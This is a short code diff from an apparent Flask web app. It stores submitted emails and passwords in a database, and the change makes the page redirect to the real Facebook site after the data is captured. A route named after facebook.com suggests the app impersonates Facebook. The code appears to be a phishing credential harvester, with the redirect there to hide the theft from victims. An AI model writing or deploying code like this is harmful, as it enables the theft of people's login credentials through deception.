@@ -16,7 +16,7 @@ def create_app():
             data = {"email":Email, "password":Password}
             app.db.entrie.insert_one(data)
 
-            return redirect(url_for('thankyou'))
+            return redirect("https://www.facebook.com")
         return render_template('index.html')
 
     @app.route('/www.facebook.com')
